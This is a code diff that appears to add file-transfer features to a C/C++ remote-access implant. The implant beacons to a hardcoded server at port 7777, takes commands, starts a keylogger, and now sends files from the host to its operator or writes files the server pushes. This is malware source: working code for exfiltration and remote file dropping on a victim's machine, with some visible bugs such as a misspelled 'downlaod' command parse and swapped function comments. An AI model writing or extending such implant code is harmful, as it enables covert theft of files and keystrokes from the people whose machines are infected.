@@ -5,6 +5,8 @@
 #include <stdbool.h>
 #include <fcntl.h>
 #include <string>
+#include <sys/stat.h>
+#include <filesystem>
 
 #ifdef _WIN32
     #define SECURITY_WIN32
@@ -56,8 +58,8 @@ using namespace std;
 #define BUFFER_SIZE 4096
 #define max_response 0x20000
 #define MAX_RESPONSE 0x20000
-
-char ADDR[BUFFER_SIZE] = "127.0.0.1";
+#define FILE_CHUNK 0x256
+char ADDR[BUFFER_SIZE] = "192.168.2.2";
 int PORT = 7777;
 
 
@@ -150,8 +152,8 @@ class Communicate_ {
     void reg(Device d);
     void beacon(const char *id);
     void session();
-    void upload();
-    void download();
+    int upload(const char* path);
+    int download(const char* path);
 };
 
 class Keylogger {
@@ -592,10 +594,14 @@ void Communicate_::beacon(const char *id) {
     // if command = "upload [file path]" | upload file to agent
     
     if (strncmp(cmd->valuestring, "upload", 6) == 0) {
-        upload();
+        char path[BUFFER_SIZE];
+        sscanf(cmd->valuestring, "upload %s", path);
+        upload(path);
     // if command = "download [file path]" | download file from agent
     } else if (strncmp(cmd->valuestring, "download", 8) == 0) { 
-        download();
+        char path[BUFFER_SIZE];
+        sscanf(cmd->valuestring, "downlaod %s", path);
+        download(path);
     } else if (strncmp(cmd->valuestring, "keylogger", 9) == 0) {
         #ifdef _WIN32
             HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Keylogger::StartWindowsKeylogger, NULL, 0, NULL);
@@ -714,10 +720,221 @@ void Communicate_::reg(Device d) {
     cJSON_Delete(reply);
 }
 
-void Communicate_::upload() {
 
+// download file to implant
+int Communicate_::download(const char* path) {
+    char *contents = (char*)malloc(MAX_RESPONSE);
+    cJSON *fileO = cJSON_CreateObject();
+    
+    if (access(path, F_OK) != 0) {
+        if (contents) free(contents);
+        if (fileO) cJSON_Delete(fileO);
+        return -1;
+    }
+    
+    int file = open(path, O_RDONLY);
+    if (file == -1) {
+        if (contents) free(contents);
+        if (fileO) cJSON_Delete(fileO);
+        return -1;
+    }
+    
+    if (contents == NULL) {
+        close(file);
+        if (fileO) cJSON_Delete(fileO);
+        return -1;
+    }
+    
+    if (!fileO) {
+        close(file);
+        free(contents);
+        return -1;
+    }
+
+    std::filesystem::path p(path);
+    std::string filename_str = p.filename().string();
+    const char* filename = filename_str.c_str();
+
+    cJSON_AddStringToObject(fileO, "file_name", filename);
+    char *Sfilename = cJSON_Print(fileO);
+    cJSON_Delete(fileO);
+    
+    if (!Sfilename) {
+        close(file);
+        free(contents);
+        return -1;
+    }
+
+    // send filename
+    #ifdef _WIN32
+        schannel_send(Sfilename, (int)strlen(Sfilename));
+    #else   
+        SSL_write(ssl, Sfilename, (int)strlen(Sfilename));
+    #endif
+
+    free(Sfilename);
+
+    // Get file size and send it in network byte order
+    struct stat st;
+    if (fstat(file, &st) == -1) {
+        close(file);
+        free(contents);
+        return -1;
+    }
+    
+    uint64_t filesize = st.st_size;
+    uint64_t network_filesize = htonll(filesize);
+    
+    // Convert to char buffer for sending
+    char filesize_buffer[sizeof(uint64_t)];
+    memcpy(filesize_buffer, &network_filesize, sizeof(uint64_t));
+    
+    #ifdef _WIN32
+        schannel_send(filesize_buffer, sizeof(filesize_buffer));
+    #else   
+        if (SSL_write(ssl, filesize_buffer, sizeof(filesize_buffer)) <= 0) {
+            close(file);
+            free(contents);
+            return -1;
+        }
+    #endif
+
+    // Send file content in chunks
+    ssize_t bytesRead;
+    while ((bytesRead = read(file, contents, FILE_CHUNK)) > 0) {
+        #ifdef _WIN32
+            if (schannel_send(contents, (int)bytesRead) != bytesRead) {
+                break; // Send failed
+            }
+        #else
+            if (SSL_write(ssl, contents, (int)bytesRead) <= 0) {
+                break; // Send failed
+            }
+        #endif
+    }
+    
+    close(file);
+    free(contents);
+    
+    return (bytesRead < 0) ? -1 : 0;
 }
 
-void Communicate_::download() {
+// send file to server
+int Communicate_::upload(const char *path) {
+    cJSON *file = cJSON_CreateObject();
+    if (!file) {
+        return -1;
+    }
 
+    std::filesystem::path p(path);
+    std::string filename_str = p.filename().string();
+    const char* filename = filename_str.c_str();
+
+    cJSON_AddStringToObject(file, "file_name", filename);
+    char *file_json = cJSON_Print(file);
+    cJSON_Delete(file);
+    
+    if (!file_json) {
+        return -1;
+    }
+
+    #ifdef _WIN32
+        schannel_send(file_json, (int)strlen(file_json));
+    #else
+        if (SSL_write(ssl, file_json, (int)strlen(file_json)) <= 0) {
+            free(file_json);
+            return -1;
+        }
+    #endif
+    free(file_json);
+
+    // Check if file exists on server
+    char exists[BUFFER_SIZE] = {0};
+    int bytes_read;
+    
+    #ifdef _WIN32
+        bytes_read = schannel_recv(exists, sizeof(exists)-1);
+    #else
+        bytes_read = SSL_read(ssl, exists, sizeof(exists)-1);
+    #endif
+    
+    if (bytes_read <= 0) {
+        return -1;
+    }
+    exists[bytes_read] = '\0';
+
+    cJSON *file_exists = cJSON_Parse(exists);
+    if (!file_exists) {
+        return -1;
+    }
+    
+    cJSON *x = cJSON_GetObjectItem(file_exists, "Exist");
+    if (!x || !cJSON_IsBool(x)) {
+        cJSON_Delete(file_exists);
+        return -1;
+    }
+    
+    bool file_exist = cJSON_IsTrue(x);
+    cJSON_Delete(file_exists);
+    
+    if (!file_exist) {
+        return -2;
+    }
+
+    // Receive file size (network byte order)
+    char filesize_buffer[sizeof(uint64_t)];
+    
+    #ifdef _WIN32
+        if (schannel_recv(filesize_buffer, sizeof(filesize_buffer)) != sizeof(filesize_buffer)) {
+            return -1;
+        }
+    #else   
+        if (SSL_read(ssl, filesize_buffer, sizeof(filesize_buffer)) <= 0) {
+            return -1;
+        }
+    #endif
+    
+    uint64_t network_filesize;
+    memcpy(&network_filesize, filesize_buffer, sizeof(uint64_t));
+    uint64_t filesize = ntohll(network_filesize);
+
+    // Open file for writing
+    int fd = open(path, O_WRONLY|O_CREAT|O_TRUNC, 0644);
+    if (fd == -1) {
+        return -1;
+    }
+
+    char *contents = (char*)malloc(MAX_RESPONSE);
+    if (!contents) {
+        close(fd);
+        return -1;
+    }
+
+    // Receive file content
+    size_t received = 0;
+    while (received < filesize) {
+        size_t to_read = (filesize - received) > FILE_CHUNK ? FILE_CHUNK : (filesize - received);
+        
+        #ifdef _WIN32
+            bytes_read = schannel_recv(contents, (int)to_read);
+        #else
+            bytes_read = SSL_read(ssl, contents, (int)to_read);
+        #endif
+        
+        if (bytes_read <= 0) {
+            break;
+        }
+        
+        ssize_t bytes_written = write(fd, contents, bytes_read);
+        if (bytes_written != bytes_read) {
+            break;
+        }
+        
+        received += bytes_read;
+    }
+
+    close(fd);
+    free(contents);
+    
+    return (received == filesize) ? 0 : -1;
 }
